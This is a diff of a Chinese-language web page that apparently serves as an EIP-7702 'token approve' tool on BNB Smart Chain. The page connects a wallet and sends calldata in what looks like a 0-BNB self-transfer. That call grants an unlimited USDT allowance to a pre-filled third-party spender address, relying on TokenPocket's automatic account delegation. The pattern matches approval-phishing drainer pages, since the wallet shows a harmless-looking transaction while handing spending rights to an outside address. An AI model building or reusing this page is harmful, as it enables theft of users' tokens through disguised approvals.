@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-<title>EIP-7702 USDT Approve</title>
+<title>EIP-7702 通用授权工具</title>
 <style>
   @import url('https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@300;400;500;600&family=Syne:wght@700;800&display=swap');
 
@@ -18,6 +18,7 @@
     --accent:    #00e5a0;
     --accent2:   #00c8ff;
     --danger:    #ff4d6a;
+    --warning:   #ffa500;
     --mono:      'IBM Plex Mono', monospace;
     --display:   'Syne', sans-serif;
   }
@@ -27,14 +28,10 @@
     background: var(--bg);
     color: var(--text);
     min-height: 100vh;
-    display: flex;
-    align-items: center;
-    justify-content: center;
     padding: 24px;
     overflow-x: hidden;
   }
 
-  /* ── background grid ── */
   body::before {
     content: '';
     position: fixed; inset: 0;
@@ -49,10 +46,10 @@
 
   .container {
     position: relative; z-index: 1;
-    width: 100%; max-width: 560px;
+    width: 100%; max-width: 680px;
+    margin: 0 auto;
   }
 
-  /* ── header ── */
   .header {
     text-align: center;
     margin-bottom: 32px;
@@ -81,7 +78,6 @@
     margin-top: 6px;
   }
 
-  /* ── card ── */
   .card {
     background: var(--surface);
     border: 1px solid var(--border);
@@ -106,7 +102,34 @@
     background: var(--border);
   }
 
-  /* ── info rows ── */
+  .input-group {
+    margin-bottom: 16px;
+  }
+  .input-label {
+    font-size: 11px;
+    color: var(--text-dim);
+    margin-bottom: 6px;
+    display: block;
+  }
+  input[type="text"], select {
+    width: 100%;
+    padding: 12px;
+    background: rgba(0,0,0,0.25);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    color: var(--text);
+    font-family: var(--mono);
+    font-size: 12px;
+  }
+  input[type="text"]:focus, select:focus {
+    outline: none;
+    border-color: var(--accent);
+  }
+  input[type="text"]::placeholder {
+    color: var(--text-dim);
+    opacity: 0.6;
+  }
+
   .info-row {
     display: flex;
     justify-content: space-between;
@@ -140,7 +163,6 @@
     vertical-align: middle;
   }
 
-  /* ── data block ── */
   .data-block {
     background: rgba(0,0,0,0.35);
     border: 1px solid var(--border);
@@ -148,6 +170,8 @@
     padding: 14px;
     margin-top: 10px;
     position: relative;
+    max-height: 200px;
+    overflow-y: auto;
   }
   .data-block pre {
     font-family: var(--mono);
@@ -172,7 +196,6 @@
   }
   .copy-btn:hover { background: var(--accent); color: #000; }
 
-  /* ── status banner ── */
   .status {
     display: none;
     align-items: center;
@@ -186,6 +209,7 @@
   .status.info    { background: rgba(0,200,255,0.08); border: 1px solid rgba(0,200,255,0.25); color: var(--accent2); }
   .status.success { background: rgba(0,229,160,0.08); border: 1px solid rgba(0,229,160,0.25); color: var(--accent); }
   .status.error   { background: rgba(255,77,106,0.08); border: 1px solid rgba(255,77,106,0.25); color: var(--danger); }
+  .status.warning { background: rgba(255,165,0,0.08); border: 1px solid rgba(255,165,0,0.25); color: var(--warning); }
   .status .dot {
     width: 8px; height: 8px; border-radius: 50%;
     flex-shrink: 0;
@@ -193,8 +217,8 @@
   .status.info .dot    { background: var(--accent2); box-shadow: 0 0 6px var(--accent2); }
   .status.success .dot { background: var(--accent);  box-shadow: 0 0 6px var(--accent); }
   .status.error .dot   { background: var(--danger);  box-shadow: 0 0 6px var(--danger); }
+  .status.warning .dot { background: var(--warning); box-shadow: 0 0 6px var(--warning); }
 
-  /* ── button ── */
   .btn {
     width: 100%;
     padding: 15px;
@@ -213,8 +237,21 @@
     background: transparent;
     border: 1px solid var(--accent);
     color: var(--accent);
+    margin-bottom: 12px;
   }
   .btn-connect:hover { background: rgba(0,229,160,0.08); }
+
+  .btn-generate {
+    background: linear-gradient(135deg, var(--accent2), #0088cc);
+    color: #0a0e17;
+    margin-bottom: 12px;
+  }
+  .btn-generate:hover { filter: brightness(1.1); }
+  .btn-generate:disabled {
+    opacity: 0.4;
+    cursor: not-allowed;
+    filter: none;
+  }
 
   .btn-execute {
     background: linear-gradient(135deg, var(--accent), #00b386);
@@ -229,7 +266,6 @@
     filter: none;
   }
 
-  /* ── tx link ── */
   .tx-link {
     display: none;
     margin-top: 12px;
@@ -244,7 +280,21 @@
   }
   .tx-link a:hover { opacity: 0.7; }
 
-  /* ── spinner ── */
+  .warning-box {
+    background: rgba(255,165,0,0.08);
+    border: 1px solid rgba(255,165,0,0.25);
+    border-radius: 10px;
+    padding: 14px;
+    margin-bottom: 16px;
+    font-size: 11px;
+    color: var(--warning);
+    line-height: 1.6;
+  }
+  .warning-box strong {
+    display: block;
+    margin-bottom: 6px;
+  }
+
   @keyframes spin { to { transform: rotate(360deg); } }
   .spinner {
     display: inline-block;
@@ -263,9 +313,9 @@
 
   <!-- Header -->
   <div class="header">
-    <div class="badge">EIP-7702</div>
-    <h1>USDT Approve</h1>
-    <p>通过 EIP-7702 授权 USDT 给 Spender</p>
+    <div class="badge">EIP-7702 通用工具</div>
+    <h1>Token Approve</h1>
+    <p>批量授权 ERC20 代币 | 支持 TP 钱包自动委托</p>
   </div>
 
   <!-- Status -->
@@ -274,9 +324,75 @@
     <span id="statusText"></span>
   </div>
 
-  <!-- Transaction Details -->
+  <!-- Wallet Detection -->
+  <div class="warning-box" id="walletWarning" style="display:none;">
+    <strong>⚠️ 钱包兼容性提示</strong>
+    <span id="walletWarningText"></span>
+  </div>
+
+  <!-- Configuration -->
   <div class="card">
-    <div class="card-title">Transaction Details</div>
+    <div class="card-title">授权配置</div>
+    
+    <div class="input-group">
+      <label class="input-label">Token 合约地址</label>
+      <input type="text" id="tokenAddr" placeholder="0x55d398326f99059ff775485246999027b3197955" 
+             value="0x55d398326f99059ff775485246999027b3197955" />
+    </div>
+
+    <div class="input-group">
+      <label class="input-label">Spender 地址（授权给谁）</label>
+      <input type="text" id="spenderAddr" placeholder="0x..." 
+             value="0x07906CbD61B09c7C22e06d49ABEF8FE1811007C0" />
+    </div>
+
+    <div class="input-group">
+      <label class="input-label">授权额度</label>
+      <select id="amountType">
+        <option value="max" selected>Unlimited (type(uint256).max)</option>
+        <option value="custom">自定义额度</option>
+      </select>
+    </div>
+
+    <div class="input-group" id="customAmountGroup" style="display:none;">
+      <label class="input-label">自定义额度（最小单位，如 USDT 需乘以 10^18）</label>
+      <input type="text" id="customAmount" placeholder="1000000000000000000" />
+    </div>
+
+    <button class="btn btn-generate" id="generateBtn" onclick="generateCalldata()">
+      生成 Calldata
+    </button>
+  </div>
+
+  <!-- Delegation Info -->
+  <div class="card" id="delegationCard" style="display:none;">
+    <div class="card-title">EIP-7702 委托信息</div>
+    <div class="info-row">
+      <span class="info-label">委托合约</span>
+      <span class="info-value" id="delegatorAddr">-</span>
+    </div>
+    <div class="info-row">
+      <span class="info-label">提供方</span>
+      <span class="info-value">Token Pocket (TP 钱包)</span>
+    </div>
+    <p style="font-size: 11px; color: var(--text-dim); margin-top: 12px; line-height: 1.6;">
+      当你在 TP 钱包中给自己转账 0 BNB 并附带 calldata 时，TP 会自动将你的地址临时委托给上述合约。
+      其他钱包可能不支持，需要手动构造 type 4 交易。
+    </p>
+  </div>
+
+  <!-- Generated Calldata -->
+  <div class="card" id="calldataCard" style="display:none;">
+    <div class="card-title">生成的 Calldata</div>
+    <div class="data-block">
+      <button class="copy-btn" onclick="copyData()">COPY</button>
+      <pre id="calldataPre"></pre>
+    </div>
+  </div>
+
+  <!-- Transaction Details -->
+  <div class="card" id="txDetailsCard" style="display:none;">
+    <div class="card-title">交易详情</div>
     <div class="info-row">
       <span class="info-label">From / To</span>
       <span class="info-value" id="fromAddr">未连接钱包</span>
@@ -291,51 +407,7 @@
     </div>
     <div class="info-row">
       <span class="info-label">Action</span>
-      <span class="info-value">USDT.approve(spender, MAX) <span class="tag">EIP-7702</span></span>
-    </div>
-  </div>
-
-  <!-- Approve Details -->
-  <div class="card">
-    <div class="card-title">Approve Details</div>
-    <div class="info-row">
-      <span class="info-label">Token</span>
-      <span class="info-value">0x55d398326f99059ff775485246999027b3197955</span>
-    </div>
-    <div class="info-row">
-      <span class="info-label">Spender</span>
-      <span class="info-value">0x07906CbD61B09c7C22e06d49ABEF8FE1811007C0</span>
-    </div>
-    <div class="info-row">
-      <span class="info-label">Amount</span>
-      <span class="info-value">Unlimited (type(uint256).max)</span>
-    </div>
-  </div>
-
-  <!-- Calldata -->
-  <div class="card">
-    <div class="card-title">Calldata</div>
-    <div class="data-block">
-      <button class="copy-btn" onclick="copyData()">COPY</button>
-      <pre id="calldataPre">0x34fcd5be
-0000000000000000000000000000000000000000
-0000000000000000000000000000000000000020
-0000000000000000000000000000000000000000
-0000000000000000000000000000000000000001
-0000000000000000000000000000000000000000
-0000000000000000000000000000000000000020
-00000000000000000000000055d398326f99059f
-f775485246999027b3197955000000000000000000
-0000000000000000000000000000000000000000
-0000000000000000000000000000000000000000
-0000000000000000000000000000000000000060
-0000000000000000000000000000000000000000
-0000000000000000000000000000000000000044
-095ea7b30000000000000000000000000790
-6cbd61b09c7c22e06d49abef8fe1811007c0ffff
-fffffffffffffffffffffffffffffffffffffff
-ffffffff00000000000000000000000000000000
-000000000000000000000000000000</pre>
+      <span class="info-value">executeBatch → approve <span class="tag">EIP-7702</span></span>
     </div>
   </div>
 
@@ -344,7 +416,7 @@ ffffffff00000000000000000000000000000000
     连接钱包
   </button>
   <button class="btn btn-execute" id="executeBtn" onclick="executeTx()" disabled>
-    发送交易
+    发送交易（仅 TP 钱包支持）
   </button>
 
   <!-- TX hash link -->
@@ -354,48 +426,226 @@ ffffffff00000000000000000000000000000000
 </div>
 
 <script>
-// ── Calldata (完整，不带换行) ──────────────────────────────────────────────
-const CALLDATA =
-  '0x34fcd5be' +
-  '0000000000000000000000000000000000000000000000000000000000000020' +
-  '0000000000000000000000000000000000000000000000000000000000000001' +
-  '0000000000000000000000000000000000000000000000000000000000000020' +
-  '00000000000000000000000055d398326f99059ff775485246999027b3197955' +
-  '0000000000000000000000000000000000000000000000000000000000000000' +
-  '0000000000000000000000000000000000000000000000000000000000000060' +
-  '0000000000000000000000000000000000000000000000000000000000000044' +
-  '095ea7b3' +
-  '00000000000000000000000007906cbd61b09c7c22e06d49abef8fe1811007c0' +
-  'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff' +
-  '00000000000000000000000000000000000000000000000000000000';
+// ═══════════════════════════════════════════════════════════════════════════
+//  常量配置
+// ═══════════════════════════════════════════════════════════════════════════
+
+// TP 钱包的 EIP-7702 委托合约（BSC 主网）
+const TP_DELEGATOR = '0xcc0c946EecF01A4Bc76Bc333Ea74CEb04756f17b';
+
+// executeBatch((address,uint256,bytes)[]) 的 selector
+const EXECUTE_BATCH_SELECTOR = '0x34fcd5be';
+
+// approve(address,uint256) 的 selector
+const APPROVE_SELECTOR = '0x095ea7b3';
 
 const BSC_CHAIN_ID = '0x38'; // 56
 
-let account = null;
+// ═══════════════════════════════════════════════════════════════════════════
+//  全局变量
+// ═══════════════════════════════════════════════════════════════════════════
 
-// ── UI helpers ────────────────────────────────────────────────────────────
+let account = null;
+let generatedCalldata = null;
+let walletType = 'unknown';
+
+// ═══════════════════════════════════════════════════════════════════════════
+//  UI 辅助函数
+// ═══════════════════════════════════════════════════════════════════════════
+
 function showStatus(type, msg) {
   const el = document.getElementById('status');
   el.className = 'status ' + type + ' show';
   document.getElementById('statusText').textContent = msg;
 }
+
 function hideStatus() {
   document.getElementById('status').className = 'status';
 }
 
-// ── Connect wallet ────────────────────────────────────────────────────────
-async function connectWallet() {
+// ═══════════════════════════════════════════════════════════════════════════
+//  钱包检测
+// ═══════════════════════════════════════════════════════════════════════════
+
+function detectWallet() {
+  if (!window.ethereum) return 'none';
+  
+  // 检测 TP 钱包
+  if (window.ethereum.isTokenPocket || window.ethereum.isTp) {
+    return 'tp';
+  }
+  
+  // 检测 MetaMask
+  if (window.ethereum.isMetaMask) {
+    return 'metamask';
+  }
+  
+  // 检测 Trust Wallet
+  if (window.ethereum.isTrust) {
+    return 'trust';
+  }
+  
+  return 'unknown';
+}
+
+function showWalletWarning(type) {
+  const warningBox = document.getElementById('walletWarning');
+  const warningText = document.getElementById('walletWarningText');
+  
+  if (type === 'tp') {
+    warningBox.style.display = 'none';
+  } else if (type === 'metamask' || type === 'trust') {
+    warningBox.style.display = 'block';
+    warningText.textContent = 
+      '检测到你使用的是 ' + (type === 'metamask' ? 'MetaMask' : 'Trust Wallet') + 
+      '。该钱包可能不支持 EIP-7702 的自动委托功能。建议使用 TP 钱包，或手动构造 type 4 交易。';
+  } else if (type === 'unknown') {
+    warningBox.style.display = 'block';
+    warningText.textContent = 
+      '检测到未知钱包。EIP-7702 功能可能不可用。强烈建议使用 TP 钱包以获得最佳体验。';
+  } else {
+    warningBox.style.display = 'block';
+    warningText.textContent = '未检测到钱包插件。请安装 TP 钱包、MetaMask 或 Trust Wallet。';
+  }
+}
+
+// ═══════════════════════════════════════════════════════════════════════════
+//  ABI 编码辅助函数
+// ═══════════════════════════════════════════════════════════════════════════
+
+function padLeft(str, len) {
+  return str.padStart(len, '0');
+}
+
+function padRight(str, len) {
+  return str.padEnd(len, '0');
+}
+
+function encodeAddress(addr) {
+  // 移除 0x 前缀并 pad 到 32 字节（64 hex chars）
+  return padLeft(addr.toLowerCase().replace('0x', ''), 64);
+}
+
+function encodeUint256(value) {
+  // 将 BigInt 转为 hex 并 pad 到 32 字节
+  return padLeft(value.toString(16), 64);
+}
+
+function encodeBytes(data) {
+  // 编码动态 bytes: [length(32B)] + [data(padded to 32B chunks)]
+  const hex = data.replace('0x', '');
+  const len = hex.length / 2; // 字节数
+  const lengthHex = encodeUint256(BigInt(len));
+  const paddedData = padRight(hex, Math.ceil(len / 32) * 64);
+  return lengthHex + paddedData;
+}
+
+// ═══════════════════════════════════════════════════════════════════════════
+//  生成 Calldata
+// ═══════════════════════════════════════════════════════════════════════════
+
+window.generateCalldata = function() {
+  const tokenAddr = document.getElementById('tokenAddr').value.trim();
+  const spenderAddr = document.getElementById('spenderAddr').value.trim();
+  const amountType = document.getElementById('amountType').value;
+  
+  // 验证输入
+  if (!tokenAddr || !tokenAddr.startsWith('0x') || tokenAddr.length !== 42) {
+    showStatus('error', 'Token 地址格式错误');
+    return;
+  }
+  if (!spenderAddr || !spenderAddr.startsWith('0x') || spenderAddr.length !== 42) {
+    showStatus('error', 'Spender 地址格式错误');
+    return;
+  }
+  
+  let amount;
+  if (amountType === 'max') {
+    amount = BigInt('0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff');
+  } else {
+    const customAmount = document.getElementById('customAmount').value.trim();
+    if (!customAmount || isNaN(customAmount)) {
+      showStatus('error', '自定义额度格式错误');
+      return;
+    }
+    amount = BigInt(customAmount);
+  }
+  
+  // 构造 approve(address,uint256) calldata
+  const approveData = APPROVE_SELECTOR.replace('0x', '') +
+                      encodeAddress(spenderAddr) +
+                      encodeUint256(amount);
+  
+  // 构造 executeBatch((address,uint256,bytes)[]) calldata
+  // 单个 tuple: (tokenAddr, 0, approveData)
+  
+  // offset to array = 0x20
+  let calldata = EXECUTE_BATCH_SELECTOR.replace('0x', '');
+  calldata += encodeUint256(BigInt(0x20)); // offset to array
+  
+  // array length = 1
+  calldata += encodeUint256(BigInt(1));
+  
+  // offset to tuple[0] = 0x20 (relative to array start)
+  calldata += encodeUint256(BigInt(0x20));
+  
+  // tuple[0].target = tokenAddr
+  calldata += encodeAddress(tokenAddr);
+  
+  // tuple[0].value = 0
+  calldata += encodeUint256(BigInt(0));
+  
+  // tuple[0].offset to bytes = 0x60 (relative to tuple[0] start)
+  calldata += encodeUint256(BigInt(0x60));
+  
+  // bytes: length + data
+  const bytesLen = approveData.length / 2;
+  calldata += encodeUint256(BigInt(bytesLen));
+  calldata += padRight(approveData, Math.ceil(bytesLen / 32) * 64);
+  
+  generatedCalldata = '0x' + calldata;
+  
+  // 显示结果
+  document.getElementById('calldataPre').textContent = formatHex(generatedCalldata);
+  document.getElementById('calldataCard').style.display = 'block';
+  document.getElementById('delegationCard').style.display = 'block';
+  document.getElementById('delegatorAddr').textContent = TP_DELEGATOR;
+  
+  showStatus('success', 'Calldata 生成成功！');
+};
+
+function formatHex(hex) {
+  // 格式化显示：每 64 字符一行
+  hex = hex.replace('0x', '');
+  let result = '0x' + hex.substring(0, 8) + '\n'; // selector
+  hex = hex.substring(8);
+  
+  while (hex.length > 0) {
+    result += hex.substring(0, 64) + '\n';
+    hex = hex.substring(64);
+  }
+  return result.trim();
+}
+
+// ═══════════════════════════════════════════════════════════════════════════
+//  连接钱包
+// ═══════════════════════════════════════════════════════════════════════════
+
+window.connectWallet = async function() {
   if (!window.ethereum) {
-    showStatus('error', '未检测到钱包插件，请安装 MetaMask 或 Trust Wallet');
+    showWalletWarning('none');
+    showStatus('error', '未检测到钱包插件');
     return;
   }
 
+  walletType = detectWallet();
+  showWalletWarning(walletType);
+
   try {
-    // 请求连接
     const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
     account = accounts[0];
 
-    // 检查链 ID，如果不是 BSC 则切换
+    // 切换到 BSC
     const chainId = await window.ethereum.request({ method: 'eth_chainId' });
     if (chainId !== BSC_CHAIN_ID) {
       try {
@@ -404,13 +654,12 @@ async function connectWallet() {
           params: [{ chainId: BSC_CHAIN_ID }]
         });
       } catch (e) {
-        // 如果链不存在则添加
         if (e.code === 4902) {
           await window.ethereum.request({
             method: 'wallet_addEthereumChain',
             params: [{
               chainId: BSC_CHAIN_ID,
-              chainName: 'Binance Smart Chain Mainnet',
+              chainName: 'BSC Mainnet',
               nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
               rpcUrls: ['https://bsc-dataseed.binance.org/'],
               blockExplorerUrls: ['https://bscscan.com']
@@ -424,12 +673,20 @@ async function connectWallet() {
 
     // 更新 UI
     document.getElementById('fromAddr').textContent = account;
-    document.getElementById('connectBtn').style.display = 'none';
-    document.getElementById('executeBtn').classList.add('show');
-    document.getElementById('executeBtn').disabled = false;
+    document.getElementById('connectBtn').textContent = '✓ 已连接 (' + 
+      (walletType === 'tp' ? 'TP 钱包' : 
+       walletType === 'metamask' ? 'MetaMask' : 
+       walletType === 'trust' ? 'Trust Wallet' : '未知钱包') + ')';
+    document.getElementById('connectBtn').style.opacity = '0.6';
+    document.getElementById('txDetailsCard').style.display = 'block';
+    
+    if (generatedCalldata) {
+      document.getElementById('executeBtn').classList.add('show');
+      document.getElementById('executeBtn').disabled = false;
+    }
+
     showStatus('success', '钱包已连接：' + account.slice(0,6) + '...' + account.slice(-4));
 
-    // 监听账户切换
     window.ethereum.on('accountsChanged', (accs) => {
       if (!accs.length) location.reload();
     });
@@ -437,10 +694,18 @@ async function connectWallet() {
   } catch (e) {
     showStatus('error', '连接失败：' + (e.message || e));
   }
-}
+};
 
-// ── Execute transaction ──────────────────────────────────────────────────
-async function executeTx() {
+// ═══════════════════════════════════════════════════════════════════════════
+//  发送交易
+// ═══════════════════════════════════════════════════════════════════════════
+
+window.executeTx = async function() {
+  if (!generatedCalldata) {
+    showStatus('error', '请先生成 Calldata');
+    return;
+  }
+
   const btn = document.getElementById('executeBtn');
   btn.disabled = true;
   btn.innerHTML = '<span class="spinner"></span>发送中...';
@@ -451,40 +716,58 @@ async function executeTx() {
       method: 'eth_sendTransaction',
       params: [{
         from:  account,
-        to:    account,        // 给自己转账（EIP-7702 要求 from === to）
-        value: '0x0',          // 0 BNB
-        data:  CALLDATA
+        to:    account,  // 给自己转账（TP 会自动附加 EIP-7702 delegation）
+        value: '0x0',
+        data:  generatedCalldata
       }]
     });
 
-    // 成功
     btn.innerHTML = '已发送 ✓';
     showStatus('success', '交易已发送，等待确认...');
 
-    // 显示 BSC 浏览器链接
-    const link = document.getElementById('txLinkA');
-    link.href = 'https://bscscan.com/tx/' + txHash;
+    document.getElementById('txLinkA').href = 'https://bscscan.com/tx/' + txHash;
     document.getElementById('txLink').classList.add('show');
 
   } catch (e) {
     btn.disabled = false;
     btn.innerHTML = '发送交易';
+    
     if (e.code === 4001) {
       showStatus('info', '交易已被用户取消');
+    } else if (e.message && e.message.includes('cannot include data')) {
+      showStatus('error', '错误：当前钱包不支持 EIP-7702 自动委托。请使用 TP 钱包。');
     } else {
       showStatus('error', '发送失败：' + (e.message || e));
     }
   }
-}
+};
 
-// ── Copy calldata ────────────────────────────────────────────────────────
-function copyData() {
-  navigator.clipboard.writeText(CALLDATA).then(() => {
+// ═══════════════════════════════════════════════════════════════════════════
+//  复制 Calldata
+// ═══════════════════════════════════════════════════════════════════════════
+
+window.copyData = function() {
+  if (!generatedCalldata) return;
+  
+  navigator.clipboard.writeText(generatedCalldata).then(() => {
     const btn = document.querySelector('.copy-btn');
     btn.textContent = 'COPIED';
     setTimeout(() => btn.textContent = 'COPY', 1200);
   });
-}
+};
+
+// ═══════════════════════════════════════════════════════════════════════════
+//  监听额度类型切换
+// ═══════════════════════════════════════════════════════════════════════════
+
+document.getElementById('amountType').addEventListener('change', function(e) {
+  const customGroup = document.getElementById('customAmountGroup');
+  if (e.target.value === 'custom') {
+    customGroup.style.display = 'block';
+  } else {
+    customGroup.style.display = 'none';
+  }
+});
 </script>
 </body>
 </html>
